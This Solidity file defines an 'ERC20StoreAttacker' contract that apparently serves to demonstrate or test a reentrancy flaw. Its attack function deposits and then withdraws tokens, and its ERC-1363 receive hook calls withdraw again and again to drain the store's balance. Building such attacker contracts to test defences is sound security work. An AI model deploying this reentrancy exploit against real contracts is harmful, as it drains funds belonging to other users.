// SPDX-License-Identifier: UNLICENSED

// Author: TrejGun
// Email: trejgun@gmail.com
// Website: https://ethberry.io/

pragma solidity ^0.8.20;

import {ERC165} from "@openzeppelin/contracts/utils/introspection/ERC165.sol";
import {IERC1363Receiver} from "@openzeppelin/contracts/interfaces/IERC1363Receiver.sol";
import {IERC1363Spender} from "@openzeppelin/contracts/interfaces/IERC1363Spender.sol";

import {ERC20Store} from "./ERC20Store.sol";
import {ERC20Token} from "./ERC20Token.sol";

contract ERC20StoreAttacker is ERC165 {
  ERC20Store public erc20Store;
  ERC20Token public erc20Token;
  uint256 public constant amount = 1 ether;

  constructor(address erc20TokenAddress, address erc20StoreAddress) {
    erc20Token = ERC20Token(erc20TokenAddress);
    erc20Store = ERC20Store(erc20StoreAddress);
  }

  function attack() external payable {
    erc20Token.approve(address(erc20Store), amount);
    erc20Store.deposit(amount);
    erc20Store.withdraw();
  }

  function onTransferReceived(
    address,
    address,
    uint256,
    bytes memory
  ) external returns (bytes4) {
    uint256 balance = erc20Token.balanceOf(address(erc20Store));
    if (balance >= amount) {
      erc20Store.withdraw();
    }
    return this.onTransferReceived.selector;
  }

  function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165) returns (bool) {
    return
      interfaceId == type(IERC1363Receiver).interfaceId ||
      interfaceId == type(IERC1363Spender).interfaceId ||
      super.supportsInterface(interfaceId);
  }
}
